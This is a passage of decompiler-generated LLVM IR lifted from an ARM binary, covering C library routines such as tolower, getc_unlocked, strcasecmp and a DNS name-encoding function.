  %v2_1a004 = icmp eq i32 %arg1, 0
  br i1 %v2_1a004, label %dec_label_pc_1a018, label %dec_label_pc_1a00c

dec_label_pc_1a00c:                               ; preds = %dec_label_pc_1a004, %dec_label_pc_19ff0
  %v0_1a00c = phi i32 [ %arg1, %dec_label_pc_1a004 ], [ %v0_1a00c.pre, %dec_label_pc_19ff0 ]
  br label %dec_label_pc_1a01c

dec_label_pc_1a018:                               ; preds = %dec_label_pc_1a004
  br label %dec_label_pc_1a01c

dec_label_pc_1a01c:                               ; preds = %dec_label_pc_1a00c, %dec_label_pc_1a018
  %v14_1a020 = phi i32 [ %v0_1a00c, %dec_label_pc_1a00c ], [ %tmp9, %dec_label_pc_1a018 ]
  ret i32 %v14_1a020

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1a01c, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1a02c = icmp slt i32 %arg1, 0
  br i1 %v1_1a02c, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_1a02c = mul i32 %arg1, 2
  %v2_1a038 = load i32, i32* bitcast (i32** @global_var_298d0.1085 to i32*), align 4
  %v2_1a03c = add i32 %v2_1a038, %v2_1a02c
  %v3_1a040 = inttoptr i32 %v2_1a03c to i8*
  %v4_1a040 = load i8, i8* %v3_1a040, align 1
  %v6_1a040 = zext i8 %v4_1a040 to i32
  %v1_1a044 = add i32 %v2_1a03c, 1
  %v2_1a044 = inttoptr i32 %v1_1a044 to i8*
  %v3_1a044 = load i8, i8* %v2_1a044, align 1
  %v4_1a044 = zext i8 %v3_1a044 to i32
  %v3_1a048 = mul nuw i32 %v4_1a044, 16777216
  %v4_1a04c = sdiv i32 %v3_1a048, 65536
  %v5_1a04c = or i32 %v4_1a04c, %v6_1a040
  ret i32 %v5_1a04c

; uselistorder directives
  uselistorder i32 %v2_1a03c, { 1, 0 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_1a058 = load i32, i32* @r4, align 4
  store i32 %v3_1a058, i32* %stack_var_-8, align 4
  %v0_1a05c = load i32, i32* @r0, align 4
  %v1_1a05c = add i32 %v0_1a05c, 16
  %v2_1a05c = inttoptr i32 %v1_1a05c to i32*
  %v3_1a05c = load i32, i32* %v2_1a05c, align 4
  store i32 %v3_1a05c, i32* %r2.global-to-local, align 4
  %v1_1a060 = add i32 %v0_1a05c, 24
  %v2_1a060 = inttoptr i32 %v1_1a060 to i32*
  %v3_1a060 = load i32, i32* %v2_1a060, align 4
  %v3_1a064 = icmp ult i32 %v3_1a05c, %v3_1a060
  store i32 %v0_1a05c, i32* @r4, align 4
  br i1 %v3_1a064, label %bb, label %dec_label_pc_1a07c

bb:                                               ; preds = %entry
  %v2_1a06c = inttoptr i32 %v3_1a05c to i8*
  %v3_1a06c = load i8, i8* %v2_1a06c, align 1
  %v4_1a06c = zext i8 %v3_1a06c to i32
  store i32 %v4_1a06c, i32* %r0.global-to-local, align 4
  %v6_1a06c = add i32 %v3_1a05c, 1
  store i32 %v6_1a06c, i32* %r2.global-to-local, align 4
  store i32 %v6_1a06c, i32* %v2_1a05c, align 4
  br label %dec_label_pc_1a17c

dec_label_pc_1a07c:                               ; preds = %entry
  %v1_1a07c = inttoptr i32 %v0_1a05c to i8*
  %v2_1a07c = load i8, i8* %v1_1a07c, align 1
  %v3_1a07c = zext i8 %v2_1a07c to i32
  %v1_1a080 = and i32 %v3_1a07c, 131
  %tmp22 = icmp ugt i32 %v1_1a080, 128
  br i1 %tmp22, label %dec_label_pc_1a09c, label %dec_label_pc_1a08c

dec_label_pc_1a08c:                               ; preds = %dec_label_pc_1a07c
  store i32 128, i32* @r1, align 4
  %v0_1a090 = call i32 @__stdio_trans2r_o()
  store i32 %v0_1a090, i32* %r0.global-to-local, align 4
  %v2_1a094 = icmp eq i32 %v0_1a090, 0
  br i1 %v2_1a094, label %dec_label_pc_1a08c.dec_label_pc_1a09c_crit_edge, label %dec_label_pc_1a178

dec_label_pc_1a08c.dec_label_pc_1a09c_crit_edge:  ; preds = %dec_label_pc_1a08c
  %v0_1a09c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a09c

dec_label_pc_1a09c:                               ; preds = %dec_label_pc_1a08c.dec_label_pc_1a09c_crit_edge, %dec_label_pc_1a07c
  %v2_1a0e8 = phi i32 [ %v0_1a09c.pre, %dec_label_pc_1a08c.dec_label_pc_1a09c_crit_edge ], [ %v0_1a05c, %dec_label_pc_1a07c ]
  %v1_1a09c = inttoptr i32 %v2_1a0e8 to i8*
  %v2_1a09c = load i8, i8* %v1_1a09c, align 1
  %v3_1a09c = zext i8 %v2_1a09c to i32
  store i32 %v3_1a09c, i32* %r2.global-to-local, align 4
  %v1_1a0a0 = add i32 %v2_1a0e8, 1
  %v2_1a0a0 = inttoptr i32 %v1_1a0a0 to i8*
  %v3_1a0a0 = load i8, i8* %v2_1a0a0, align 1
  %v4_1a0a0 = zext i8 %v3_1a0a0 to i32
  %v4_1a0a4 = mul nuw nsw i32 %v4_1a0a0, 256
  %v5_1a0a4 = or i32 %v4_1a0a4, %v3_1a09c
  store i32 %v5_1a0a4, i32* %r2.global-to-local, align 4
  %v1_1a0a8 = and i32 %v3_1a09c, 2
  %v2_1a0a8 = icmp eq i32 %v1_1a0a8, 0
  br i1 %v2_1a0a8, label %dec_label_pc_1a0d8, label %dec_label_pc_1a0b0

dec_label_pc_1a0b0:                               ; preds = %dec_label_pc_1a09c
  %tmp23 = urem i8 %v2_1a09c, 2
  %v1_1a0b0 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_1a0b0
  %v4_1a0b4 = and i32 %tmp18, 4
  %v5_1a0b4 = add i32 %v4_1a0b4, %v2_1a0e8
  %v1_1a0b8 = add i32 %v5_1a0b4, 36
  %v2_1a0b8 = inttoptr i32 %v1_1a0b8 to i8*
  %v3_1a0b8 = load i8, i8* %v2_1a0b8, align 1
  %v4_1a0b8 = zext i8 %v3_1a0b8 to i32
  %v1_1a0bc = add nsw i32 %v5_1a0a4, -1
  store i32 %v1_1a0bc, i32* %r2.global-to-local, align 4
  %v3_1a0c0 = sdiv i32 %v1_1a0bc, 256
  store i32 %v3_1a0c0, i32* %r1.global-to-local, align 4
  store i32 %v4_1a0b8, i32* %r0.global-to-local, align 4
  %v2_1a0cc = add i32 %v2_1a0e8, 40
  %v3_1a0cc = inttoptr i32 %v2_1a0cc to i32*
  store i32 0, i32* %v3_1a0cc, align 4
  %v0_1a0d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a0d0 = trunc i32 %v0_1a0d0 to i8
  %v2_1a0d0 = load i32, i32* @r4, align 4
  %v3_1a0d0 = add i32 %v2_1a0d0, 1
  %v4_1a0d0 = inttoptr i32 %v3_1a0d0 to i8*
  store i8 %v1_1a0d0, i8* %v4_1a0d0, align 1
  br label %dec_label_pc_1a10c

dec_label_pc_1a0d8:                               ; preds = %dec_label_pc_1a09c
  %v1_1a0d8 = add i32 %v2_1a0e8, 16
  store i32 %v1_1a0d8, i32* %r1.global-to-local, align 4
  %v1_1a0dc = inttoptr i32 %v1_1a0d8 to i32*
  %v2_1a0dc = load i32, i32* %v1_1a0dc, align 4
  store i32 %v2_1a0dc, i32* %r1.global-to-local, align 4
  %v3_1a0dc = add i32 %v2_1a0e8, 20
  %v4_1a0dc = inttoptr i32 %v3_1a0dc to i32*
  %v5_1a0dc = load i32, i32* %v4_1a0dc, align 4
  %v9_1a0e0 = icmp eq i32 %v5_1a0dc, %v2_1a0dc
  br i1 %v9_1a0e0, label %dec_label_pc_1a0f0, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1a0d8
  %v2_1a0e4 = inttoptr i32 %v2_1a0dc to i8*
  %v3_1a0e4 = load i8, i8* %v2_1a0e4, align 1
  %v4_1a0e4 = zext i8 %v3_1a0e4 to i32
  store i32 %v4_1a0e4, i32* %r0.global-to-local, align 4
  %v6_1a0e4 = add i32 %v2_1a0dc, 1
  store i32 %v6_1a0e4, i32* %r1.global-to-local, align 4
  store i32 %v6_1a0e4, i32* %v1_1a0dc, align 4
  br label %dec_label_pc_1a17c

dec_label_pc_1a0f0:                               ; preds = %dec_label_pc_1a0d8
  %v1_1a0f0 = add i32 %v2_1a0e8, 4
  %v2_1a0f0 = inttoptr i32 %v1_1a0f0 to i32*
  %v3_1a0f0 = load i32, i32* %v2_1a0f0, align 4
  %v4_1a0f8 = icmp eq i32 %v3_1a0f0, -2
  br i1 %v4_1a0f8, label %dec_label_pc_1a0fc, label %dec_label_pc_1a114

dec_label_pc_1a0fc:                               ; preds = %dec_label_pc_1a0f0
  %v1_1a0fc = or i32 %v5_1a0a4, 4
  store i32 %v1_1a0fc, i32* %r2.global-to-local, align 4
  store i8 %v3_1a0a0, i8* %v2_1a0a0, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a10c

dec_label_pc_1a10c:                               ; preds = %dec_label_pc_1a0b0, %dec_label_pc_1a0fc
  %v0_1a10c = load i32, i32* %r2.global-to-local, align 4
  %v1_1a10c = trunc i32 %v0_1a10c to i8
  %v2_1a10c = load i32, i32* @r4, align 4
  %v3_1a10c = inttoptr i32 %v2_1a10c to i8*
  store i8 %v1_1a10c, i8* %v3_1a10c, align 1
  br label %dec_label_pc_1a17c

dec_label_pc_1a114:                               ; preds = %dec_label_pc_1a0f0
  %v1_1a114 = and i32 %v4_1a0a4, 768
  %v2_1a114 = icmp eq i32 %v1_1a114, 0
  br i1 %v2_1a114, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_1a114
  store i32 ptrtoint (i32** @global_var_295b4.1037 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_1a114, %bb19
  store i32 106784, i32* @lr, align 4
  %v1_1a11c = xor i1 %v2_1a114, true
  call void @__pseudo_cond_branch(i1 %v1_1a11c, i32 ptrtoint (i32* @global_var_18e5c.1392 to i32))
  %v0_1a120 = load i32, i32* @r4, align 4
  %v1_1a120 = add i32 %v0_1a120, 8
  store i32 %v1_1a120, i32* %r2.global-to-local, align 4
  %v1_1a124 = inttoptr i32 %v1_1a120 to i32*
  %v2_1a124 = load i32, i32* %v1_1a124, align 4
  store i32 %v2_1a124, i32* %r2.global-to-local, align 4
  %v3_1a124 = add i32 %v0_1a120, 12
  %v4_1a124 = inttoptr i32 %v3_1a124 to i32*
  %v5_1a124 = load i32, i32* %v4_1a124, align 4
  %v9_1a128 = icmp eq i32 %v5_1a124, %v2_1a124
  br i1 %v9_1a128, label %dec_label_pc_1a15c, label %dec_label_pc_1a130

dec_label_pc_1a130:                               ; preds = %bb20
  %v2_1a130 = add i32 %v0_1a120, 24
  %v3_1a130 = inttoptr i32 %v2_1a130 to i32*
  store i32 %v2_1a124, i32* %v3_1a130, align 4
  %v0_1a134 = load i32, i32* @r4, align 4
  store i32 %v0_1a134, i32* %r0.global-to-local, align 4
  %v2_1a138 = call i32 @__stdio_rfill(i32 %v0_1a134)
  store i32 %v2_1a138, i32* %r0.global-to-local, align 4
  %v2_1a13c = icmp eq i32 %v2_1a138, 0
  br i1 %v2_1a13c, label %dec_label_pc_1a178, label %dec_label_pc_1a144

dec_label_pc_1a144:                               ; preds = %dec_label_pc_1a130
  %v0_1a144 = load i32, i32* @r4, align 4
  %v1_1a144 = add i32 %v0_1a144, 20
  %v2_1a144 = inttoptr i32 %v1_1a144 to i32*
  %v3_1a144 = load i32, i32* %v2_1a144, align 4
  %v2_1a148 = add i32 %v0_1a144, 24
  %v3_1a148 = inttoptr i32 %v2_1a148 to i32*
  store i32 %v3_1a144, i32* %v3_1a148, align 4
  %v0_1a14c = load i32, i32* @r4, align 4
  %v1_1a14c = add i32 %v0_1a14c, 16
  %v2_1a14c = inttoptr i32 %v1_1a14c to i32*
  %v3_1a14c = load i32, i32* %v2_1a14c, align 4
  %v1_1a150 = inttoptr i32 %v3_1a14c to i8*
  %v2_1a150 = load i8, i8* %v1_1a150, align 1
  %v3_1a150 = zext i8 %v2_1a150 to i32
  store i32 %v3_1a150, i32* %r0.global-to-local, align 4
  %v5_1a150 = add i32 %v3_1a14c, 1
  store i32 %v5_1a150, i32* %v2_1a14c, align 4
  br label %dec_label_pc_1a17c

dec_label_pc_1a15c:                               ; preds = %bb20
  %v1_1a15c = inttoptr i32 %v0_1a120 to i8*
  store i32 %v0_1a120, i32* %r0.global-to-local, align 4
  %v2_1a160 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_1a160, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1a168 = call i32 @__stdio_READ(i8* %v1_1a15c, i32 %v2_1a160, i32 1)
  store i32 %v5_1a168, i32* %r0.global-to-local, align 4
  %v2_1a16c = icmp eq i32 %v5_1a168, 0
  br i1 %v2_1a16c, label %dec_label_pc_1a178, label %bb21

bb21:                                             ; preds = %dec_label_pc_1a15c
  %v4_1a170 = load i8, i8* %stack_var_-9, align 1
  %v5_1a170 = sext i8 %v4_1a170 to i32
  store i32 %v5_1a170, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a17c

dec_label_pc_1a178:                               ; preds = %dec_label_pc_1a15c, %dec_label_pc_1a08c, %dec_label_pc_1a130
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a17c

dec_label_pc_1a17c:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_1a144, %dec_label_pc_1a10c, %dec_label_pc_1a178
  %v2_1a180 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1a180, i32* @r4, align 4
  %v8_1a180 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_1a180

; uselistorder directives
  uselistorder i32 %v2_1a0dc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1a09c, { 1, 0, 2 }
  uselistorder i32 %v2_1a0e8, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_1a05c, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 10, 5, 6, 7, 8, 9, 13, 12 }
  uselistorder i8** @global_var_295ec.1021, { 1, 0, 2 }
  uselistorder i32** @global_var_295b4.1037, { 0, 2, 1 }
  uselistorder i32 40, { 11, 12, 13, 5, 14, 1, 2, 0, 6, 7, 8, 9, 10, 3, 4 }
  uselistorder i32 36, { 9, 10, 11, 12, 13, 14, 15, 16, 4, 1, 0, 6, 7, 8, 2, 3, 5 }
  uselistorder i8 2, { 0, 1, 2, 3, 4, 7, 5, 6, 8 }
  uselistorder i32 131, { 1, 0 }
  uselistorder i32 24, { 27, 28, 29, 30, 31, 32, 33, 34, 18, 36, 0, 25, 9, 16, 10, 1, 19, 20, 21, 22, 23, 24, 11, 35, 12, 13, 14, 15, 7, 4, 3, 8, 2, 5, 6, 17, 26 }
  uselistorder label %dec_label_pc_1a17c, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_1a178, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_1a10c, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_1a198

dec_label_pc_1a198:                               ; preds = %bb8, %entry
  %v8_1a1fc3 = phi i32 [ %v8_1a1fc, %bb8 ], [ 0, %entry ]
  %v0_1a1f0 = phi i32 [ %v1_1a1f0, %bb8 ], [ %arg2, %entry ]
  %v0_1a1f4 = phi i32 [ %v1_1a1f4, %bb8 ], [ %tmp, %entry ]
  %v9_1a198 = icmp eq i32 %v0_1a1f4, %v0_1a1f0
  br i1 %v9_1a198, label %dec_label_pc_1a198._crit_edge, label %dec_label_pc_1a1a0

dec_label_pc_1a198._crit_edge:                    ; preds = %dec_label_pc_1a198
  %.pre = inttoptr i32 %v0_1a1f0 to i8*
  br label %bb8

dec_label_pc_1a1a0:                               ; preds = %dec_label_pc_1a198
  %v1_1a1a4 = inttoptr i32 %v0_1a1f4 to i8*
  %v2_1a1a4 = load i8, i8* %v1_1a1a4, align 1
  %v3_1a1a4 = zext i8 %v2_1a1a4 to i32
  %v1_1a1a8 = inttoptr i32 %v0_1a1f0 to i8*
  %v2_1a1a8 = load i8, i8* %v1_1a1a8, align 1
  %v3_1a1a8 = zext i8 %v2_1a1a8 to i32
  %v2_1a1ac = load i32, i32* bitcast (i32** @global_var_298d0.1085 to i32*), align 4
  %v2_1a1b0 = mul nuw nsw i32 %v3_1a1a4, 2
  %v2_1a1b4 = mul nuw nsw i32 %v3_1a1a8, 2
  %v2_1a1b8 = add i32 %v2_1a1b4, %v2_1a1ac
  %v2_1a1bc = add i32 %v2_1a1ac, %v2_1a1b0
  %v1_1a1c0 = add i32 %v2_1a1bc, 1
  %v2_1a1c0 = inttoptr i32 %v1_1a1c0 to i8*
  %v3_1a1c0 = load i8, i8* %v2_1a1c0, align 1
  %v4_1a1c0 = zext i8 %v3_1a1c0 to i32
  %v1_1a1c4 = add i32 %v2_1a1b8, 1
  %v2_1a1c4 = inttoptr i32 %v1_1a1c4 to i8*
  %v3_1a1c4 = load i8, i8* %v2_1a1c4, align 1
  %v4_1a1c4 = zext i8 %v3_1a1c4 to i32
  %v3_1a1c8 = inttoptr i32 %v2_1a1b8 to i8*
  %v4_1a1c8 = load i8, i8* %v3_1a1c8, align 1
  %v6_1a1c8 = zext i8 %v4_1a1c8 to i32
  %v3_1a1cc = inttoptr i32 %v2_1a1bc to i8*
  %v4_1a1cc = load i8, i8* %v3_1a1cc, align 1
  %v6_1a1cc = zext i8 %v4_1a1cc to i32
  %v3_1a1d0 = mul nuw i32 %v4_1a1c4, 16777216
  %v3_1a1d4 = mul nuw i32 %v4_1a1c0, 16777216
  %v4_1a1d8 = sdiv i32 %v3_1a1d4, 65536
  %v5_1a1d8 = or i32 %v6_1a1cc, %v4_1a1d8
  %v4_1a1dc = sdiv i32 %v3_1a1d0, 65536
  %v5_1a1dc = or i32 %v4_1a1dc, %v6_1a1c8
  %v2_1a1e0 = sub nsw i32 %v5_1a1d8, %v5_1a1dc
  %v9_1a1e0 = icmp eq i32 %v5_1a1d8, %v5_1a1dc
  br i1 %v9_1a1e0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_1a1a0
  ret i32 %v2_1a1e0

bb8:                                              ; preds = %dec_label_pc_1a198._crit_edge, %dec_label_pc_1a1a0
  %v1_1a1e8.pre-phi = phi i8* [ %.pre, %dec_label_pc_1a198._crit_edge ], [ %v1_1a1a4, %dec_label_pc_1a1a0 ]
  %v8_1a1fc = phi i32 [ %v8_1a1fc3, %dec_label_pc_1a198._crit_edge ], [ %v2_1a1e0, %dec_label_pc_1a1a0 ]
  %v2_1a1e8 = load i8, i8* %v1_1a1e8.pre-phi, align 1
  %v2_1a1ec = icmp eq i8 %v2_1a1e8, 0
  %v1_1a1f0 = add i32 %v0_1a1f0, 1
  %v1_1a1f4 = add i32 %v0_1a1f4, 1
  store i32 %v1_1a1f4, i32* @lr, align 4
  br i1 %v2_1a1ec, label %dec_label_pc_1a1fc, label %dec_label_pc_1a198

dec_label_pc_1a1fc:                               ; preds = %bb8
  ret i32 %v8_1a1fc

; uselistorder directives
  uselistorder i32 %v1_1a1f4, { 1, 0 }
  uselistorder i32 %v2_1a1e0, { 1, 0 }
  uselistorder i32 %v5_1a1dc, { 1, 0 }
  uselistorder i32 %v5_1a1d8, { 1, 0 }
  uselistorder i32 %v0_1a1f0, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1a204 = load i32, i32* @r4, align 4
  store i32 %v3_1a204, i32* %stack_var_-24, align 4
  %v6_1a204 = load i32, i32* @r5, align 4
  %v9_1a204 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1a20c = load i32, i32* @r1, align 4
  store i32 %v0_1a20c, i32* @r6, align 4
  %v0_1a210 = load i32, i32* @r2, align 4
  store i32 %v0_1a210, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a27819 = icmp slt i8* %arg1, null
  store i1 %v1_1a27819, i1* %cpsr_n.global-to-local, align 1
  %v2_1a27820 = icmp eq i8* %arg1, null
  store i1 %v2_1a27820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a27820, label %dec_label_pc_1a290, label %dec_label_pc_1a284

dec_label_pc_1a21c:                               ; preds = %dec_label_pc_1a284
  %v2_1a21c = call i32 @__GI_strchr(i32 %v0_1a21c21, i32 46)
  store i32 %v2_1a21c, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a220 = icmp slt i32 %v2_1a21c, 0
  store i1 %v1_1a220, i1* %cpsr_n.global-to-local, align 1
  %v2_1a220 = icmp eq i32 %v2_1a21c, 0
  store i1 %v2_1a220, i1* %cpsr_z.global-to-local, align 1
  %v0_1a224 = load i32, i32* @r4, align 4
  %v2_1a224 = sub i32 %v2_1a21c, %v0_1a224
  store i32 %v2_1a224, i32* %ip.global-to-local, align 4
  store i32 %v0_1a224, i32* %r0.global-to-local, align 4
  br i1 %v2_1a220, label %dec_label_pc_1a230, label %dec_label_pc_1a238

dec_label_pc_1a230:                               ; preds = %dec_label_pc_1a21c
  %v1_1a228 = inttoptr i32 %v0_1a224 to i8*
  %v3_1a230 = call i32 @strlen(i8* %v1_1a228)
  store i32 %v3_1a230, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_1a230, 16777216
  %v1_1a234 = sdiv i32 %sext, 16777216
  store i32 %v1_1a234, i32* %ip.global-to-local, align 4
  %v0_1a244.pre = load i32, i32* @r4, align 4
  %v0_1a254.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a238

dec_label_pc_1a238:                               ; preds = %dec_label_pc_1a21c, %dec_label_pc_1a230
  %v0_1a254 = phi i32 [ %v2_1a21c, %dec_label_pc_1a21c ], [ %v0_1a254.pre, %dec_label_pc_1a230 ]
  %v0_1a244 = phi i32 [ %v0_1a224, %dec_label_pc_1a21c ], [ %v0_1a244.pre, %dec_label_pc_1a230 ]
  %v0_1a264 = phi i32 [ %v2_1a224, %dec_label_pc_1a21c ], [ %v1_1a234, %dec_label_pc_1a230 ]
  %v0_1a238 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a238 = add i32 %v0_1a238, 1
  store i32 %v1_1a238, i32* @lr, align 4
  %v1_1a23c = load i32, i32* %r8.global-to-local, align 4
  %v2_1a23c = sub i32 %v1_1a23c, %v0_1a238
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a240 = icmp slt i32 %v0_1a264, 0
  store i1 %v1_1a240, i1* %cpsr_n.global-to-local, align 1
  %v2_1a240 = icmp eq i32 %v0_1a264, 0
  store i1 %v2_1a240, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1a244, i32* @r1, align 4
  %v0_1a248 = load i32, i32* @r6, align 4
  %v2_1a248 = add i32 %v0_1a248, %v1_1a238
  store i32 %v2_1a248, i32* @r0, align 4
  store i32 %v0_1a264, i32* @r2, align 4
  %v1_1a250 = add i32 %v2_1a23c, -1
  %v1_1a254 = add i32 %v0_1a254, 1
  store i32 %v1_1a254, i32* @r4, align 4
  br i1 %v2_1a240, label %.loopexit, label %dec_label_pc_1a25c

dec_label_pc_1a25c:                               ; preds = %dec_label_pc_1a238
  %v2_1a25c = sub i32 %v0_1a264, %v1_1a250
  %v3_1a25c = icmp ult i32 %v0_1a264, %v1_1a250
  %v4_1a25c = xor i32 %v1_1a250, %v0_1a264
  %v5_1a25c = xor i32 %v2_1a25c, %v0_1a264
  %v6_1a25c = and i32 %v5_1a25c, %v4_1a25c
  %v7_1a25c = icmp slt i32 %v6_1a25c, 0
  store i1 %v7_1a25c, i1* %cpsr_v.global-to-local, align 1
  %v8_1a25c = icmp slt i32 %v2_1a25c, 0
  store i1 %v8_1a25c, i1* %cpsr_n.global-to-local, align 1
  %v9_1a25c = icmp eq i32 %v0_1a264, %v1_1a250
  store i1 %v9_1a25c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1a25c, label %dec_label_pc_1a264, label %.loopexit

dec_label_pc_1a264:                               ; preds = %dec_label_pc_1a25c
  %v1_1a264 = trunc i32 %v0_1a264 to i8
  %v4_1a264 = add i32 %v0_1a248, %v0_1a238
  %v5_1a264 = inttoptr i32 %v4_1a264 to i8*
  store i8 %v1_1a264, i8* %v5_1a264, align 1
  %v0_1a268 = load i32, i32* @lr, align 4
  %v1_1a268 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a268 = add i32 %v1_1a268, %v0_1a268
  store i32 %v2_1a268, i32* %r7.global-to-local, align 4
  %v0_1a26c = call i32 @memcpy()
  store i32 %v0_1a26c, i32* %r0.global-to-local, align 4
  %v0_1a270 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a270 = icmp slt i32 %v0_1a270, 0
  store i1 %v1_1a270, i1* %cpsr_n.global-to-local, align 1
  %v2_1a270 = icmp eq i32 %v0_1a270, 0
  store i1 %v2_1a270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a270, label %dec_label_pc_1a290, label %dec_label_pc_1a264.dec_label_pc_1a278_crit_edge

dec_label_pc_1a264.dec_label_pc_1a278_crit_edge:  ; preds = %dec_label_pc_1a264
  %v0_1a278.pre = load i32, i32* @r4, align 4
  store i32 %v0_1a278.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a278 = icmp slt i32 %v0_1a278.pre, 0
  store i1 %v1_1a278, i1* %cpsr_n.global-to-local, align 1
  %v2_1a278 = icmp eq i32 %v0_1a278.pre, 0
  store i1 %v2_1a278, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a278, label %dec_label_pc_1a290, label %dec_label_pc_1a284

dec_label_pc_1a284:                               ; preds = %entry, %dec_label_pc_1a264.dec_label_pc_1a278_crit_edge
  %v0_1a21c21 = phi i32 [ %v0_1a278.pre, %dec_label_pc_1a264.dec_label_pc_1a278_crit_edge ], [ %tmp, %entry ]
  %v1_1a284 = inttoptr i32 %v0_1a21c21 to i8*
  %v2_1a284 = load i8, i8* %v1_1a284, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a288 = icmp eq i8 %v2_1a284, 0
  store i1 %v2_1a288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a288, label %dec_label_pc_1a290, label %dec_label_pc_1a21c

dec_label_pc_1a290:                               ; preds = %dec_label_pc_1a264.dec_label_pc_1a278_crit_edge, %dec_label_pc_1a264, %dec_label_pc_1a284, %entry
  %v0_1a290 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a290 = icmp slt i32 %v0_1a290, 0
  store i1 %v1_1a290, i1* %cpsr_n.global-to-local, align 1
  %v2_1a290 = icmp eq i32 %v0_1a290, 0
  store i1 %v2_1a290, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_1a290, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1a290
  %v5_1a298 = load i32, i32* %r7.global-to-local, align 4
  %v6_1a298 = add i32 %v5_1a298, 1
  store i32 %v6_1a298, i32* %r0.global-to-local, align 4
  %v7_1a29c = load i32, i32* @r6, align 4
  %v9_1a29c = add i32 %v7_1a29c, %v5_1a298
  %v10_1a29c = inttoptr i32 %v9_1a29c to i8*
  store i8 0, i8* %v10_1a29c, align 1
  %v0_1a2a0.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1a2a0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1a2a0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1a290, %bb
  %v2_1a2a0 = phi i1 [ %v2_1a2a0.pre, %bb ], [ false, %dec_label_pc_1a290 ]
  %v1_1a2a0 = phi i1 [ %v1_1a2a0.pre, %bb ], [ %v1_1a290, %dec_label_pc_1a290 ]
  %v0_1a2a0 = phi i1 [ %v0_1a2a0.pre, %bb ], [ %v2_1a290, %dec_label_pc_1a290 ]
